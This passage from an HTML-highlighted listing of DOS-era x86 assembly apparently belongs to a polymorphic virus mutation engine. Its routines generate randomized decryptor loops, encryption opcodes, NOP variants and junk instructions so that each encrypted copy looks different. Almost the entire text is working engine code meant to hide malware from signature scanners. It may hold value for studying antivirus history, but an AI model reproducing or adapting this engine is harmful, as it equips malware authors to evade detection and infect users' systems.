                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">save_it</span><span class="sc0">
</span><span class="sc5">do_scasw</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AE</span><span class="sc0">                  </span><span class="sc1">;SCASB</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">save_it</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              generate loop command</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_loop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;no JNE if couting down</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">loop_loop</span><span class="sc0">               </span><span class="sc1">;  (prefetch bug!)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;LOOPNZ/LOOP or JNE?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cx_loop</span><span class="sc0">

</span><span class="sc5">loop_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1A</span><span class="sc0">                   </span><span class="sc1">;LOOPNZ or LOOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ll0</span><span class="sc0">                     </span><span class="sc1">;  no LOOPNZ if xor-offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;  no LOOPNZ if CMPSW/SCASW</span><span class="sc0">
</span><span class="sc5">ll0</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">cx_loop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                   </span><span class="sc1">;SUB CX or DEC CX?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cxl_dec</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E983</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">do_jne</span><span class="sc0">                

</span><span class="sc5">cxl_dec</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">49</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">do_jne</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">75</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ll0</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              add value to AL depending on register type</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">add_dir</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir_change</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">xx1</span><span class="sc0">

</span><span class="sc5">add_ind</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ind_change</span><span class="sc0">
</span><span class="sc5">xx1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              mov encryption command byte to AL</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">get_xor</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">how_mode</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">xlat</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              change ADD into ADC</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_carry</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;ADD/SUB used for encryption?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_ac</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                   </span><span class="sc1">;carry with (encr.) ADD/SUB?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_ac</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CF</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">no_ac</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              change AL (byte/word)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">add_1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">add_1_ret</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">add_1_ret</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              change AL (byte/word)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">maybe_2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81</span><span class="sc0">                   </span><span class="sc1">;can't touch this</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">maybe_not</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">maybe_not</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">maybe_not</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              get random nop (or not)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_nop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flags</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_nop</span><span class="sc0">
</span><span class="sc5">yes_nop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nop8</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nop16</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nop16x</span><span class="sc0">
</span><span class="sc5">no_nop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Insert random instructions</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_junk</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flags</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_junk</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;put a random number of</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">                   </span><span class="sc1">;  dummy instructions before</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;  decryptor</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">junk_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">junk</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">junk_loop</span><span class="sc0">
</span><span class="sc5">no_junk</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              get rough random nop (may affect register values)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">junk</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1E</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">aa0</span><span class="sc0">
</span><span class="sc5">nop16x</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">
</span><span class="sc5">aa0</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">junkcals</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              NOP and junk addresses</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">junkcals</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop16x0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop16x1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop16x2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop16x3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop8</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk6</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk7</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk8</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk9</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkA</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkB</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkC</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkD</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkE</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkF</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              NOP and junk routines</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">nop16x0</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000F</span><span class="sc0">                 </span><span class="sc1">;J* 0000 (conditional)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">nop16x1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">                 </span><span class="sc1">;JMP xxxx / junk</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">;get lenght of bullshit</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fill_bullshit</span><span class="sc0">


</span><span class="sc5">nop16x2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">junkD</span><span class="sc0">                   </span><span class="sc1">;XCHG AX,reg / XCHG AX,reg</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">nop16x3</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">junkF</span><span class="sc0">                   </span><span class="sc1">;INC / DEC or DEC / INC</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">nop8</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;8-bit NOP</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop_data8</span><span class="sc0">
                </span><span class="sc6">xlat</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">nop16</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;16-bit NOP</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0303</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nop_data16</span><span class="sc0">
                </span><span class="sc6">xlat</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">junk6</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;CALL xxxx / junk / POP reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fill_bullshit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;insert POP reg</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;more?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">junk6_ret</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F087</span><span class="sc0">                </span><span class="sc1">;insert XCHG SI,reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">j6_1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
</span><span class="sc5">j6_1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_nop</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0F7FBh</span><span class="sc0">               </span><span class="sc1">;insert XOR [SI],xxxx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_xor</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">junk6_ret</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">junk7</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">                   </span><span class="sc1">;MOV reg,xxxx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_sp</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">byte_word</span><span class="sc0">


</span><span class="sc5">junk8</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc0">                   </span><span class="sc1">;DO r/m,r(8/16)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_sp</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">junk9</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">                  </span><span class="sc1">;DO r(8/16),r/m</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_sp2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_bp</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


